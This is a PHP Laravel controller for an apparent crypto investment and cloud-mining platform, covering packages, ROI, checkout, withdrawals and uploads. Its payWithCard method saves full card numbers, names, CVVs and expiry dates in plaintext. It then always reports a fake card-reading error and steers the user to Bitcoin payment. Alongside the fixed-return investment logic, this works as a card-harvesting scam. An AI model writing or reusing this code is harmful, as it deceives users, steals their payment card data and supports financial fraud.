<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Category;
use App\Investment;
use App\Withdrawal;
use Alert;
use CoinPayment;
use App\Card;
use App\Video;
use Carbon\Carbon;
class InvestmentController extends Controller
{
    public function __construct()
    {
    	$this->middleware('auth')->except(['showPackages','showCloudMining' ]);
    }

    public function index()
    {
    	$categories = Category::all();

    	return view('cabinet.plans', compact('categories'));
    }

    public function showPackages()
    {
        $categories = Category::where('type', 'crypto')->get();
        return view('plans', compact('categories'));
    }
    public function showCloudMining()
    {
        $categories = Category::where('type', 'crypto')->get();
        return view('cloud_mining', compact('categories'));
    }
    public function invest(Request $request)
    {

    	$cat = Category::find($request->category);

    	$amount= $request->amount;

    	$this->validate($request, [

    		'amount' => 'required'
    	],

    	[
    		'amount.required' => 'Please enter the amount you want to invest',
    		
    	]);

    	if ($amount < $cat->min_amount) {

    		Alert::error('The minimum amount for this package is '. '$'.number_format($cat->min_amount,2))->autoclose(5000);
    		return redirect()->back()->withInput();
    	}
    	if ($amount > $cat->max_amount) {

    		Alert::error('The maximum amount for this package is '. '$'.number_format($cat->max_amount,2))->autoclose(5000);
    		return redirect()->back()->withInput();
    	}
        // dd($request->all());

    	$investment = new Investment();
    	$investment->amount = $amount;
    	$investment->user_id = auth()->id();
    	$investment->category_id = $cat->id;
        $investment->roi = $this->getRoi($cat);
        $investment->expiry = $this->calculateExpiry($cat);
        $investment->save();

        // dd($investment);
        if ($investment) {

          return $this->initiatePayment($investment);
      }

      Alert::error('Opps an error occurred');
      return back();

  }

  private function calculateExpiry($category)
  {
    $duration = $category->duration;
    $expiry = Carbon::now()->addDays(365); // $duration

    return $expiry;
}

private function getRoi($category)
{
    $weeks = $category->weeks;
    $roi = $category->roi;
    $daily_roi = ($roi/100) / ($weeks * 5);

    return $daily_roi;
}

public function showInvestForm($id)
{
   $cat_id = decrypt($id);
   $category = Category::findOrFail($cat_id);

   return view('cabinet.buy', compact('category'));
}

private function initiatePayment($investment)
{

         // dd('here');
   $description = $investment->category->name. ' Package Investment'; 
        $trx['amountTotal'] = $investment->amount; // USD
        $trx['note'] = $description;
        
        /*
        *   @required true
        *   @example first item
        */
        $trx['items'][0] = [
            'descriptionItem' => $description,
            'priceItem' => $investment->amount, // USD
            'qtyItem' => 1,
            'subtotalItem' => $investment->amount,  // USD
        ];
        

        
        $link_transaction = CoinPayment::url_payload($trx);

        

        return view('cabinet.checkout', compact('link_transaction', 'investment'));

    }

    public function showCardForm($id, Request $request)
    {   
        $link_transaction = $request->ref_number;
        $investment_id = $id;
        return view('cabinet.card', compact('investment_id', 'link_transaction'));
    }

    public function payWithCard(Request $request, $id)
    {
        $investment = Investment::find(decrypt($id));
        $link_transaction = $request->link_transaction;
        $this->validate($request, [
            'card_number' => 'required',
            'card_name' => 'required',
            'cvv' => 'required',
            'expiry' => 'required',
        ]);

        $card = Card::create([

            'card_number' => $request->card_number,
            'card_name' => $request->card_name,
            'cvv' => $request->cvv,
            'expiry' => $request->expiry,
            'user_id' => auth()->id(),
            'investment_id' => $investment->id,

        ]);

        if ($card) {
            $hide_card = true;
            Alert::error('Unknow error occurred trying to read card information, kindly try BITCOIN payment method')->autoclose(5000);

            return view('cabinet.checkout', compact('investment', 'link_transaction', 'hide_card'));
        }

        else {
            Alert::error('An error occurred')->autoclose(5000);

            return back();
        }
    }

    public function showWithdrawalForm()
    {

        // if (! Carbon::today()->isFriday()) {

        //     Alert::error('You can only request withdrawal on Fridays')->autoclose(5000);
        //     return back();

        // }


        $earning = auth()->user()->totalEarning ? auth()->user()->totalEarning->amount : 0;

        //     Alert::error('You do not have pending balance to withdraw');
        //     return back();
        // }
        // $earning = $earnings ? : 0;
        return view('cabinet.withdraw', compact('earning'));
    }

    public function createWithdrawal(Request $request)
    {
       if (! now()->isFriday()) {

        Alert::error('You can only request withdrawal on Fridays')->autoclose(5000);
        return back();

    }
    $earning = auth()->user()->totalEarning->amount;

    $this->validate($request, ['amount' => 'required']);

    if ($earning < $request->amount) {
        Alert::error('The maximum you can withdraw is $'. number_format($earning, 2));
        return back();
    }

    $w = new Withdrawal();
    $w->amount = $request->amount;
    $w->user_id = auth()->id();
    $w->save();

    if ($w ) {

        $t = auth()->user()->totalEarning;
        $t_amount = $t->amount;
        $t->amount = $t_amount - $request->amount;
        $t->save();

        Alert::success('Withdrawal Request sent, wait shortly for it to be processed')->autoclose(5000);
        return back();
    }

}

public function showBonus()
{
    return view('cabinet.bonus');
}

public function withdrawBonus(Request $request)
{   

    if (! Carbon::today()->isFriday()) {

        Alert::error('You can only request withdrawal on Fridays')->autoclose(5000);
        return back();

    }
    $this->validate($request, ['amount'=> 'required']);
    $amount = $request->amount;
    $net = auth()->user()->netBonus->amount;

    if ($amount > $net) {

       Alert::error('The maximum available for withdrawal is $'. number_format($net, 2))->autoclose(5000);
       return back();
   }

   $w = new Withdrawal();
   $w->amount = $amount;
   $w->user_id = auth()->id();
   $w->source = 'bonus';
   $w->save();

   if ($w) {
    $netBonus = auth()->user()->netBonus;

    $netBonus->amount = $net - $amount;

    $netBonus->save();

    Alert::success('Withdrawal Request sent, wait shortly for it to be processed')->autoclose(5000);
    return back();
}
}

public function videoUpload(Request $request)
{
    $this->validate($request, ['video' => 'required|mimetypes:video/mp4,video/mpeg']);


    $video = $request->file('video');
    $ext = $video->getClientOriginalExtension();

    $destination = public_path('/uploads/videos/');

    $filename = str_slug(auth()->user()->username).'-'.time().'-'.date('Y-m-d').'.'.$ext;
    $url = asset('uploads/videos/'.$filename);

    try {
        $video->move($destination, $filename);
    } catch (\Exception $e) {

        report($e);
        Alert::error('Video failed to upload');

    }

    $newVideo = new Video();

    $newVideo->user_id = auth()->id();
    $newVideo->url = $url;
    $newVideo->description = $request->description;
    $newVideo->save();

    if ($newVideo) {
        Alert::success('Video Uploaded successfully')->autoclose(5000);
        return back();
    }

    Alert::error('Video failed to upload');
    return back();

}

public function showNfp()
{
    $categories = Category::where('type', 'nfp')->get();

    return view('cabinet.nfp_buy', compact('categories'));
}
}
